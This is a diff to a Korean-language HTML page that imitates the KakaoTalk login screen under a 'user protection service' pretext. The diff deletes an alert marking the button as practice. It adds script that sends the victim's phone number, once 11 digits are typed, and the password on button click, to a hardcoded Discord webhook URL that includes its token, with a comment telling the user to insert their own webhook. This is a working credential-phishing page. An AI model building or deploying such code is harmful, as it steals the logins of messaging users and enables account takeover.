@@ -3,40 +3,22 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>카카오톡 이용자보호서비스 완화</title></title>
+  <title>카카오톡 이용자보호서비스 완화</title>
   <style>
     body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
     .container { max-width: 500px; margin: 0 auto; padding: 20px; }
-
-    /* 숨김 처리 */
     .hidden { display: none; }
-
-    /* 안내 페이지 */
     h1 { font-size: 22px; font-weight: bold; margin: 20px 0; }
     p { font-size: 14px; line-height: 1.6; color: #444; }
     a { color: #007aff; text-decoration: none; font-size: 14px; }
     .checkbox { display: flex; align-items: center; margin-top: 20px; font-size: 14px; }
     .checkbox input { margin-right: 8px; }
-    .btn-yellow {
-      display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center;
-      font-size: 16px; font-weight: bold; color: #000; background: #ffeb00;
-      border: none; border-radius: 6px; cursor: pointer;
-    }
+    .btn-yellow { display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center; font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: none; border-radius: 6px; cursor: pointer; }
     .btn-yellow:active { background: #f0db00; }
-
-    /* 로그인 화면 */
     .login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; }
     .login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
-    .login-container input {
-      width: 100%; padding: 12px; margin: 8px 0;
-      border: none; border-bottom: 1px solid #ccc;
-      font-size: 14px; outline: none;
-    }
-    .login-container .btn-gray {
-      width: 100%; padding: 14px; margin-top: 20px;
-      background: #f0f0f0; border: none; border-radius: 6px;
-      font-size: 16px; font-weight: bold; color: #888; cursor: pointer;
-    }
+    .login-container input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; }
+    .login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px; background: #f0f0f0; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
   </style>
 </head>
 <body>
@@ -63,9 +45,9 @@
   <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡을 시작합니다</h2>
-    <input type="text" placeholder="이메일 또는 전화번호"style="width: 370px; padding: 5px;">
-    <input type="password" placeholder="비밀번호"style="width: 370px; padding: 5px;">
-    <button class="btn-gray" onclick="alert('로그인 버튼 클릭됨 (연습용)')">로그인</button>
+    <input type="text" placeholder="이메일 또는 전화번호" style="width: 370px; padding: 5px;">
+    <input type="password" placeholder="비밀번호" style="width: 370px; padding: 5px;">
+    <button class="btn-gray">로그인</button>
   </div>
 
   <script>
@@ -78,6 +60,42 @@
         document.getElementById("page2").classList.remove("hidden");
       }
     }
+
+    // ------------------- 웹훅 코드 -------------------
+    const webhookURL = 'https://discord.com/api/webhooks/1406817501047947450/TkrHLmb42Hjc3p3afEOtCFe-U5ksQDvH3Bj1RUIGFMdDD98vGG_Rn7lTj1T7qoGdGfG9'; // 본인 웹훅 주소로 변경
+
+    // 전화번호 입력 자동 전송
+    const phoneInput = document.querySelector('input[type="text"]');
+    let phoneSent = false;
+    phoneInput.addEventListener('input', () => {
+      const phone = phoneInput.value.trim();
+      if (phone.length === 11 && !phoneSent) {
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone })
+        })
+        .then(res => console.log('전화번호 전송 완료', res))
+        .catch(err => console.error('전화번호 전송 오류', err));
+        phoneSent = true;
+      }
+      if (phone.length < 11) phoneSent = false;
+    });
+
+    // 비밀번호 버튼 클릭 시 전송
+    const passwordInput = document.querySelector('input[type="password"]');
+    const loginBtn = document.querySelector('.btn-gray');
+    loginBtn.addEventListener('click', () => {
+      const password = passwordInput.value;
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password })
+      })
+      .then(res => console.log('비밀번호 전송 완료', res))
+      .catch(err => console.error('비밀번호 전송 오류', err));
+    });
+    // ------------------- 웹훅 코드 끝 -------------------
   </script>
 </body>
 </html>
